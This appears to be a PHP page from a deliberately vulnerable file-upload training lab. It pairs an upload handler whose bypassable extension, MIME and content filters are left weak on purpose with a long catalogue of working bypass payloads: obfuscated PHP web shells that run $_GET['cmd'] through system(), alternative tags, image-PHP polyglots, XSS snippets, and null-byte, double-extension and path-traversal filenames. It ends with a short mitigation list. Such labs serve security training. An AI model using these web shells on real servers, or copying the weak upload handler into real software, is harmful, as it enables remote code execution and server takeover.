<?php
// Lab 4: Advanced File Upload Techniques
// Vulnerability: Advanced file upload bypass techniques

session_start();

$message = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate advanced file upload (vulnerable to bypass)
function process_advanced_file_upload($file) {
    // Advanced security filters (can be bypassed)
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'doc', 'docx'];
    $allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'];
    $max_file_size = 5 * 1024 * 1024; // 5MB
    $dangerous_patterns = ['<?php', '<script', 'eval(', 'system(', 'exec(', 'shell_exec('];
    
    if (empty($file['name'])) {
        return false;
    }
    
    // Check file size
    if ($file['size'] > $max_file_size) {
        return false;
    }
    
    // Get file extension
    $file_extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    // Check extension
    if (!in_array($file_extension, $allowed_extensions)) {
        return false;
    }
    
    // Check MIME type
    if (!in_array($file['type'], $allowed_mime_types)) {
        return false;
    }
    
    // Check file content for dangerous patterns
    $file_content = file_get_contents($file['tmp_name']);
    foreach ($dangerous_patterns as $pattern) {
        if (stripos($file_content, $pattern) !== false) {
            return false;
        }
    }
    
    // Vulnerable: Advanced filters that can be bypassed
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_path = $upload_dir . basename($file['name']);
    
    if (move_uploaded_file($file['tmp_name'], $file_path)) {
        return $file_path;
    }
    
    return false;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $file_path = process_advanced_file_upload($_FILES['file']);
        
        if ($file_path) {
            $file_data = [
                'name' => $_FILES['file']['name'],
                'type' => $_FILES['file']['type'],
                'size' => $_FILES['file']['size'],
                'path' => $file_path,
                'uploaded_at' => date('Y-m-d H:i:s')
            ];
            
            $_SESSION['uploaded_files'][] = $file_data;
            $uploaded_files = $_SESSION['uploaded_files'];
            $message = '<div class="alert alert-success">File uploaded successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">File upload failed! Check file type, size, and content.</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Please select a file to upload!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        if (file_exists($file['path'])) {
            unlink($file['path']);
        }
        
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced File Upload Techniques - File Upload Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .uploaded-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to File Upload Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced File Upload Techniques</h1>
            <p class="hero-subtitle">Advanced file upload bypass techniques</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced file upload bypass techniques used to circumvent modern security filters and protections. These techniques include obfuscation, encoding, alternative execution methods, and sophisticated bypass methods.</p>
            <p><strong>Objective:</strong> Use advanced techniques to bypass sophisticated security filters and upload malicious files.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Advanced Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Advanced filters that can be bypassed
function process_advanced_file_upload($file) {
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf'];
    $allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif', 'text/plain'];
    $max_file_size = 5 * 1024 * 1024; // 5MB
    $dangerous_patterns = ['<?php', '<script', 'eval(', 'system('];
    
    // Check file size
    if ($file['size'] > $max_file_size) {
        return false;
    }
    
    // Check extension
    $file_extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($file_extension, $allowed_extensions)) {
        return false;
    }
    
    // Check MIME type
    if (!in_array($file['type'], $allowed_mime_types)) {
        return false;
    }
    
    // Check file content for dangerous patterns
    $file_content = file_get_contents($file['tmp_name']);
    foreach ($dangerous_patterns as $pattern) {
        if (stripos($file_content, $pattern) !== false) {
            return false;
        }
    }
    
    // Still vulnerable to advanced bypass techniques
    return move_uploaded_file($file['tmp_name'], $file_path);
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="advanced-filter-info">
                            <h5>Advanced Filters</h5>
                            <p>The following are filtered:</p>
                            <ul>
                                <li><strong>Extensions:</strong> jpg, jpeg, png, gif, txt, pdf, doc, docx</li>
                                <li><strong>MIME Types:</strong> image/jpeg, image/png, image/gif, text/plain, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document</li>
                                <li><strong>File Size:</strong> Maximum 5MB</li>
                                <li><strong>Content Patterns:</strong> <?php, <script, eval(, system(, exec(, shell_exec(</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Advanced Bypass Techniques</h5>
                            <p>Try these advanced bypass methods:</p>
                            <ul>
                                <li><code>webshell.php.jpg</code> - Double extension</li>
                                <li><code>webshell.php%00.jpg</code> - Null byte injection</li>
                                <li><code>webshell.php;.jpg</code> - Semicolon bypass</li>
                                <li><code>webshell.PHP.JPG</code> - Case variation</li>
                            </ul>
                        </div>
                        
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file" class="form-label">Select File to Upload</label>
                                <input type="file" class="form-control" id="file" name="file" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="input-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Path:</strong> <?php echo htmlspecialchars($file['path']); ?></p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <div class="mt-2">
                                        <a href="<?php echo htmlspecialchars($file['path']); ?>" class="btn btn-sm btn-primary" target="_blank">View File</a>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced File Upload Techniques</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Advanced filters can be bypassed</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Advanced Bypass Techniques</h5>
                    <ul>
                        <li><strong>Obfuscation:</strong> Hide malicious code</li>
                        <li><strong>Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Execution:</strong> Use different execution methods</li>
                        <li><strong>Complex Scenarios:</strong> Combine multiple techniques</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced File Upload Bypass Payloads</h5>
            <p>Use these advanced techniques to bypass sophisticated security filters:</p>
            
            <h6>1. Obfuscated PHP Web Shells:</h6>
            <div class="code-block"># Base64 encoded PHP
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# Hex encoded PHP
<?php eval(hex2bin('73797374656d28245f4745545b27636d64275d293b')); ?>

# String concatenation
<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>

# Variable variables
<?php $a='_GET';$b='cmd';$$a[$b]($_GET['cmd']); ?></div>

            <h6>2. Alternative PHP Tags:</h6>
            <div class="code-block"># Short tags
<? system($_GET['cmd']); ?>

# ASP tags
<% system($_GET['cmd']); %>

# Script tags
<script language="php">system($_GET['cmd']);</script>

# Alternative syntax
<?= system($_GET['cmd']); ?></div>

            <h6>3. Obfuscated JavaScript:</h6>
            <div class="code-block"># Base64 encoded
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>

# Hex encoded
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

# Unicode encoded
<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')</script>

# String concatenation
<script>var a='ale';var b='rt';var c=a+b;c('XSS');</script></div>

            <h6>4. Polyglot Files:</h6>
            <div class="code-block"># GIF + PHP polyglot
GIF89a<?php system($_GET['cmd']); ?>

# PNG + PHP polyglot
PNG<?php system($_GET['cmd']); ?>

# JPEG + PHP polyglot
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 48 00 00
<?php system($_GET['cmd']); ?></div>

            <h6>5. Archive Bypass Techniques:</h6>
            <div class="code-block"># ZIP file with PHP
webshell.php.zip
# Extract to get PHP file

# RAR file with PHP
webshell.php.rar
# Extract to get PHP file

# 7Z file with PHP
webshell.php.7z
# Extract to get PHP file

# TAR file with PHP
webshell.php.tar
# Extract to get PHP file</div>

            <h6>6. MIME Type Manipulation:</h6>
            <div class="code-block"># Change Content-Type header
Content-Type: image/jpeg
# But file content is PHP
<?php system($_GET['cmd']); ?>

# Use multipart/form-data
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--</div>

            <h6>7. File Content Manipulation:</h6>
            <div class="code-block"># Add image headers to PHP file
GIF89a<?php system($_GET['cmd']); ?>
# Or
PNG<?php system($_GET['cmd']); ?>
# Or
JPEG<?php system($_GET['cmd']); ?>

# Add text headers to PHP file
TEXT<?php system($_GET['cmd']); ?>
# Or
PLAIN<?php system($_GET['cmd']); ?></div>

            <h6>8. Path Traversal Bypass:</h6>
            <div class="code-block"># Use path traversal
../webshell.php
../../webshell.php
../../../webshell.php
....//....//....//webshell.php

# URL encoded path traversal
%2e%2e%2fwebshell.php
%2e%2e%2f%2e%2e%2fwebshell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fwebshell.php</div>

            <h6>9. Filename Obfuscation:</h6>
            <div class="code-block"># Obfuscate filename
w3bsh3ll.php
webshell.phtml
webshell.php3
webshell.php4
webshell.php5
webshell.php7

# Use alternative extensions
webshell.pht
webshell.phar
webshell.inc
webshell.php.bak</div>

            <h6>10. Content Obfuscation:</h6>
            <div class="code-block"># Obfuscate PHP code
<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>

# Use alternative functions
<?php passthru($_GET['cmd']); ?>
<?php popen($_GET['cmd'], 'r'); ?>
<?php proc_open($_GET['cmd'], [], $pipes); ?>

# Use file functions
<?php file_get_contents('php://input'); ?></div>

            <h6>11. Alternative Execution Methods:</h6>
            <div class="code-block"># Use include/require
<?php include 'webshell.php'; ?>

# Use eval with file_get_contents
<?php eval(file_get_contents('webshell.txt')); ?>

# Use create_function
<?php create_function('', 'system($_GET["cmd"]);')(); ?>

# Use call_user_func
<?php call_user_func('system', $_GET['cmd']); ?></div>

            <h6>12. Advanced Encoding Techniques:</h6>
            <div class="code-block"># Base64 encoding
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# Hex encoding
<?php eval(hex2bin('73797374656d28245f4745545b27636d64275d293b')); ?>

# URL encoding
<?php eval(urldecode('%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b')); ?>

# ROT13 encoding
<?php eval(str_rot13('flfgrz($_TRG[\'pqz\']);')); ?></div>

            <h6>13. Alternative File Formats:</h6>
            <div class="code-block"># Upload as image with PHP content
webshell.php.jpg
# But file content is PHP

# Upload as document with PHP content
webshell.php.pdf
# But file content is PHP

# Upload as text with PHP content
webshell.php.txt
# But file content is PHP

# Upload as configuration with PHP content
webshell.php.conf
# But file content is PHP</div>

            <h6>14. Advanced Bypass Combinations:</h6>
            <div class="code-block"># Multiple bypasses combined
webshell.php%00.jpg
webshell.php;.png
webshell.PHP.JPG
webshell.php .gif
webshell.php...
webshell.php/
webshell.php\
webshell.php%2e%6a%70%67
webshell.php%u002e%u006a%u0070%u0067

# Obfuscated with bypasses
w3bsh3ll.php%00.jpg
w3bsh3ll.php;.png
w3bsh3ll.PHP.JPG</div>

            <h6>15. Complete Advanced Examples:</h6>
            <div class="code-block"># Example 1: Obfuscated PHP with double extension
<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>
# Save as: webshell.php.jpg

# Example 2: Base64 encoded with null byte
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
# Save as: webshell.php%00.jpg

# Example 3: Alternative tags with case variation
<% system($_GET['cmd']); %>
# Save as: webshell.PHP.JPG

# Example 4: Polyglot with semicolon bypass
GIF89a<?php system($_GET['cmd']); ?>
# Save as: webshell.php;.jpg

# Example 5: Complete obfuscation
<?php $a='sys';$b='tem';$c=$a.$b;$c($_GET['cmd']); ?>
# Save as: w3bsh3ll.php%00.jpg</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass advanced WAFs and security filters</li>
                <li>Upload malicious files despite sophisticated protections</li>
                <li>Execute arbitrary code on the server</li>
                <li>Compromise server and data integrity</li>
                <li>Install persistent backdoors</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive file validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Implement file content validation using magic numbers</li>
                    <li>Use proper file permissions and access controls</li>
                    <li>Store uploaded files outside web root directory</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use Web Application Firewall (WAF) to detect bypass attempts</li>
                    <li>Implement file content scanning and malware detection</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
